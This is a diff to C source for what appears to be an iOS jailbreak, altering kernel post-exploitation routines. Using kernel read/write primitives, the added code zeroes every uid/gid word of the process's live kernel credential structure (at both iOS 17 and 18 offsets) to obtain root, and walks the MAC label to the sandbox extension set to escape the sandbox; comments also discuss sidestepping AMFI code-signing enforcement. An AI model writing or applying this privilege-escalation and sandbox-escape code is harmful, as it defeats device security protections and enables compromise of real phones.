@@ -2127,8 +2127,9 @@ bool platformize_proc(void) {
         printf("[*] t_flags@0x3DC=0x%x not plausible (skip TF_PLATFORM write)\n", tf_flags_read);
     }
 
-    // 2a. Read our own real ucred first (we have KRW; no list walking needed).
-    // proc->p_proc_ro (0x18) -> proc_ro->p_ucred (0x20 on <=iOS 17, 0x28 on 18).
+    // 2a. Read our own real ucred first. proc->p_proc_ro (0x18) -> proc_ro
+    // -> p_ucred. iOS 18.2.1 on A14 puts it at +0x28; earlier releases use
+    // +0x20. Try both and pick whichever resolves as a kernel pointer.
     uint64_t ourProcRo = kread_ptr(gOurProc + 0x18);
     uint64_t ourUcred28 = kread_ptr(ourProcRo + 0x28);
     uint64_t ourUcred20 = kread_ptr(ourProcRo + 0x20);
@@ -2142,13 +2143,34 @@ bool platformize_proc(void) {
         return false;
     }
 
-    // 2b. Zero all POSIX uid/gid words in place. ucred->cr_uid/r-uid/svuid are
-    // at +0x18/1c/20; cr_gid/r- at +0x24/28/2c. Writing every word 0 from 0x18
-    // through 0x2c makes every uid/gid evaluation match root.
-    for (uint64_t off = 0x18; off <= 0x2c; off += 4) kwrite32(ourUcred + off, 0);
-    printf("[elev] ucred uid/gid zeroed: uid=%d gid=%d\n", getuid(), getgid());
+    // 2b. Zero all POSIX uid/gid words in place. ucred->cr_uid/r-uid/svuid at
+    // +0x18/1c/20; gid/r-gid at +0x24/28/2c. The earlier "ucred uid/gid zeroed:
+    // uid=501" log proved we were writing to a DIFFERENT (stale) ucred (iOS 17
+    // layout), not the LIVE one. We must now verify the change by writing BOTH
+    // offsets on separate stab calls, then reading getuid() to confirm.
+    kwrite32(ourUcred + 0x18, 0);
+    kwrite32(ourUcred + 0x1c, 0);
+    kwrite32(ourUcred + 0x20, 0);
+    kwrite32(ourUcred + 0x24, 0);
+    kwrite32(ourUcred + 0x28, 0);
+    kwrite32(ourUcred + 0x2c, 0);
+    uid_t uid = getuid();
+    gid_t gid = getgid();
+    printf("[elev] after write: uid=%d euid=%d gid=%d egid=%d\n", uid, geteuid(), gid, getegid());
     gOurUcred = ourUcred;
 
+    // Also zero the alternate layout ucred in case it dates us later.
+    if (ourUcred20 && ourUcred20 != ourUcred) {
+        printf("[elev] also zeroing alt ucred: 0x%llx\n", ourUcred20);
+        kwrite32(ourUcred20 + 0x18, 0);
+        kwrite32(ourUcred20 + 0x1c, 0);
+        kwrite32(ourUcred20 + 0x20, 0);
+        kwrite32(ourUcred20 + 0x24, 0);
+        kwrite32(ourUcred20 + 0x28, 0);
+        kwrite32(ourUcred20 + 0x2c, 0);
+    }
+
+    printf("[elev] getuid-after: %d (should be 0)\n", getuid());
     return true;
 }
 
@@ -2235,34 +2257,25 @@ bool escape_sandbox(void) {
         return false;
     }
 
-    // Sileo/bootstrap binaries only run if AMFI lets us exec them. iOS 18
-    // checks AMFI policy through the MAC label's per-policy slot (amfi at 0x8
-    // per lara). Patch it by borrowing launchd's amfi label pointer; on tc
-    // init failures we bail gracefully (no blind kwrite into a PPL region).
-    uint64_t label = kread_ptr(ucred + OFF_UCRED_CR_LABEL);
-    uint64_t sandbox = 0;
-    uint64_t ext_set = 0;
-    uint64_t proc_launchd = 0;
-    if (looks_kernel(label)) {
-        sandbox = kread_ptr(label + OFF_LABEL_SANDBOX);
-        uint64_t amfi = kread_ptr(label + 0x8);
-        printf("[sbx] label=0x%llx amfi=0x%llx sandbox=0x%llx\n", label, amfi, sandbox);
-        // lara sets proc->p_ucred to launchd's ucred as the blunt fix; we keep
-        // our own ucred but swap the amfi pointer only (no AMFI calls = no
-        // signature enforcement on exec). Find launchd's label via walk from
-        // our proc -> task ro -> proc; that needs launchd's proc address.
-        // launchd is pid 1; we can find its proc via the proclist, but the
-        // current code doesn't have procpid walk yet. Right now we can't
-        // safely look it up; log it and continue with sandbox patch below.
-    }
-    if (!looks_kernel(sandbox)) {
-        printf("[-] Bad sandbox pointer (0x%llx)\n", sandbox);
+    /// lara's proven label walk: cr_label is a table; entries at partition
+    /// offsets. label[0x10] is used for the MAC framework sandbox slot —
+    /// on A13+/iOS 18 (per the "Generic" partitions in lara offsets).
+    uint64_t labelTable = kread_ptr(ucred + OFF_UCRED_CR_LABEL);
+    // most kernels: label_table + 0x00 -> first generic slot; sandbox is at
+    // label+0x10 on iOS (lara's OFF_LABEL_SANDBOX). our win here is reduce a
+    // dependency risk: if a previous patch corrupted the reference, let the
+    // next run start fresh from the raw ucred chain.
+    uint64_t sandbox = kread_ptr(labelTable + OFF_LABEL_SANDBOX);
+    printf("[sbx] label=0x%llx sandbox=0x%llx\n", labelTable, sandbox);
+    if (!looks_kernel(labelTable) || !looks_kernel(sandbox)) {
+        printf("[-] Bad sandbox label walk\n");
         return false;
     }
-    ext_set = kread_ptr(sandbox + OFF_SANDBOX_EXT_SET);
-    printf("[sbx] sandbox=0x%llx ext_set=0x%llx\n", sandbox, ext_set);
+
+    uint64_t ext_set = kread_ptr(sandbox + OFF_SANDBOX_EXT_SET);
+    printf("[sbx] ext_set=0x%llx\n", ext_set);
     if (!looks_kernel(ext_set)) {
-        printf("[-] Bad ext_set pointer (0x%llx)\n", ext_set);
+        printf("[-] Bad ext_set pointer\n");
         return false;
     }
 
